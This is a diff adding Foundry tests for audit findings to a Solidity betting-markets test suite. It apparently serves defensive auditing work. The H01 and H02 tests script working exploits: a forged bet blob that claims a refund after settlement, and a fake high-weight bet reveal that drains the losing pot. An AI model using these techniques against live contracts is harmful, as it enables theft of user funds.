@@ -1456,4 +1456,115 @@ contract MarketsTest is Test, DeployTestnet {
         vm.prank(operatorFeeDistributor);
         markets.distributeOperatorFees(requests);
     }
+
+    function testAuditH01GetRefundWithInvalidBetBlob(uint256 betAmount) public {
+        betAmount = bound(betAmount, 1, type(uint96).max);
+
+        // Alice/Bob place legitimate bets. Bob loses but does not reveal bet.
+        // Alice gets bob's money, but Bob plans on faking a refund
+        BetContext memory bobBetContext;
+        {
+            MarketContext memory marketContext = makeMarketContext();
+            BetContext memory aliceBetContext = makeBetContext(alice, betAmount, 0, 0, marketContext.marketCommitment);
+            placeBet(alice, aliceBetContext.request);
+
+            bobBetContext = makeBetContext(bob, betAmount, 1, 0, marketContext.marketCommitment);
+            placeBet(bob, bobBetContext.request);
+
+            WeightedParimutuelMarkets.ResultInfo memory resultInfo = WeightedParimutuelMarkets.ResultInfo({
+                winningOutcomeMask: 1 << aliceBetContext.betInfo.outcome,
+                losingTotalPot: betAmount,
+                winningTotalWeight: betAmount,
+                marketCommitment: marketContext.marketCommitment
+            });
+            (ResultBlob memory resultBlob,,) = revealResult(marketContext, resultInfo);
+
+            markets.revealBet(marketContext.marketBlob, resultBlob, aliceBetContext.request, aliceBetContext.betBlob);
+        }
+        vm.assertEq(erc20.balanceOf(alice), betAmount * 2, "Alice got whole pot");
+
+        // Bob requests refund even though market settled, by faking the bet blob
+        {
+            MarketCommitment fakeMarket = MarketCommitment.wrap(bytes32(0));
+            WeightedParimutuelMarkets.BetHiddenInfo memory betInfo = bobBetContext.betInfo;
+            betInfo.marketCommitment = fakeMarket;
+            BetBlob memory fakeBetBlob = BetBlob({ data: abi.encode(betInfo) });
+
+            // Give some tokens to markets contract which will be extracted
+            erc20.mint(address(markets), betAmount);
+
+            // Contract should check the bet blob matches the request
+            vm.roll(refundStartBlock);
+            markets.requestRefund(bobBetContext.request, fakeBetBlob);
+        }
+    }
+
+    function testAuditH02DrainMarketWithMaliciousRequest(uint256 betAmount) public {
+        betAmount = bound(betAmount, 1, type(uint96).max);
+
+        // Alice/Bob place legitimate bets. And market result is revealed. Noone reveals bet so carol can steal the losing pot
+        MarketContext memory marketContext = makeMarketContext();
+        ResultBlob memory resultBlob;
+        {
+            BetContext memory aliceBetContext = makeBetContext(alice, betAmount, 0, 0, marketContext.marketCommitment);
+            placeBet(alice, aliceBetContext.request);
+
+            BetContext memory bobBetContext = makeBetContext(bob, betAmount, 1, 0, marketContext.marketCommitment);
+            placeBet(bob, bobBetContext.request);
+
+            WeightedParimutuelMarkets.ResultInfo memory resultInfo = WeightedParimutuelMarkets.ResultInfo({
+                winningOutcomeMask: 1 << aliceBetContext.betInfo.outcome,
+                losingTotalPot: betAmount,
+                winningTotalWeight: betAmount,
+                marketCommitment: marketContext.marketCommitment
+            });
+            (resultBlob,,) = revealResult(marketContext, resultInfo);
+        }
+        vm.assertEq(erc20.balanceOf(address(markets)), betAmount * 2, "Markets have both bets");
+
+        // Carol reveals fake bet to steal the whole losingPot
+        {
+            // Since winningTotalWeight is 1, we can make betWeight consume all funds in the contract
+            uint256 weight = betAmount;
+            BetContext memory carolBetContext = makeBetContext(carol, 0, 0, 0, marketContext.marketCommitment, weight);
+            markets.revealBet(marketContext.marketBlob, resultBlob, carolBetContext.request, carolBetContext.betBlob);
+        }
+        vm.assertEq(erc20.balanceOf(carol), betAmount, "Carol stole losingPot");
+        vm.assertEq(erc20.balanceOf(address(markets)), betAmount, "Only half the money remains");
+    }
+
+    function testAuditM01FeesChangeRetroactively(uint256 creatorFeesDecimal, uint256 operatorFeesDecimal) public {
+        creatorFeesDecimal = bound(creatorFeesDecimal, 1, 3e3);
+        operatorFeesDecimal = bound(operatorFeesDecimal, 1, 3e3);
+
+        uint256 betAmount = 10e18;
+
+        // Place bets, but change fees before reveals
+        MarketContext memory marketContext = makeMarketContext();
+        BetContext memory aliceBetContext = makeBetContext(alice, betAmount, 0, 0, marketContext.marketCommitment);
+        placeBet(alice, aliceBetContext.request);
+
+        BetContext memory bobBetContext = makeBetContext(bob, betAmount, 1, 0, marketContext.marketCommitment);
+        placeBet(bob, bobBetContext.request);
+
+        ResultBlob memory resultBlob;
+        {
+            WeightedParimutuelMarkets.ResultInfo memory resultInfo = WeightedParimutuelMarkets.ResultInfo({
+                winningOutcomeMask: 1 << aliceBetContext.betInfo.outcome,
+                losingTotalPot: betAmount,
+                winningTotalWeight: betAmount,
+                marketCommitment: marketContext.marketCommitment
+            });
+            (resultBlob,,) = revealResult(marketContext, resultInfo);
+        }
+
+        // Set fees before reveal
+        vm.prank(admin);
+        markets.setFees(uint16(creatorFeesDecimal), uint16(operatorFeesDecimal));
+
+        markets.revealBet(marketContext.marketBlob, resultBlob, aliceBetContext.request, aliceBetContext.betBlob);
+
+        vm.assertGt(markets.operatorFees(erc20), 0, "Operator fees");
+        vm.assertGt(markets.creatorFees(erc20, address(creator)), 0, "Creator fees");
+    }
 }
